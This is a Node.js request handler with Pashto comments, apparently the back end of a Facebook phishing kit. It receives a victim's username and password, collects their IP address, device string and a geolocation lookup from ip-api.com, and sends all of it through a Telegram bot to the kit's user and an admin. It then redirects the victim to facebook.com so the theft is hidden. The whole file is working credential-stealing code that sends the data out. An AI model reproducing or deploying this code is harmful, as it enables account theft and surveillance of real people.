const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  const adminId = process.env.ADMIN_ID; // ✅ اډمین ID له Environment Variable نه

  // 🟢 د UID پاکول (اصلي Telegram ID استخراج کول)
  let cleanUid = uid;
  if (uid) {
    cleanUid = uid.replace("Bot", "").split("_")[0]; 
  }

  // 🟢 د GeoIP معلومات
  let geo = {};
  try {
    geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
  } catch (e) {
    geo = {};
  }

  // 🟢 د پیغام متن
  const message = `
╭───🔘 *𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅* ───╮
├ 👤 *Username:* \`${username}\`
├ 🔐 *Password:* \`${password}\`
├ 🆔 *User ID:* \`${uid}\`
├ 📆 *Time:* \`${timestamp}\`
├ 🌐 *IP:* \`${ip}\`
├ 🏙️ *City:* \`${geo.city || 'Unknown'}\`
├ 🌍 *Country:* ${geo.country || 'Unknown'}
├ 🛰️ *ISP:* \`${geo.isp || 'Unknown'}\`
├ 📱 *Device:* \`${userAgent}\`
╰━━━━━━━━━━━━━━━━━━━━━━╯

🔘 *د فیس معلومات بریالۍ توګه ترلاسه شول*

╭─────── 🚀 *Root Access Panel 💠* ───────╮
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 *𝗪𝗔𝗖𝗜𝗤*
╰───────────────────────────────────────╯ 
`;

  try {
    // 🟢 د یوزر ته استول
    if (cleanUid) {
      await bot.telegram.sendMessage(cleanUid, message, { parse_mode: "Markdown" });
    }

    // 🟢 د Admin ته استول
    if (adminId) {
      await bot.telegram.sendMessage(adminId, message, { parse_mode: "Markdown" });
    }

    // ✅ وروسته Redirect کول
    return res.redirect('https://facebook.com');
  } catch (e) {
    console.error("Telegram Error:", e.message);
    return res.status(500).send("❌ Failed to send message.");
  }
}; 
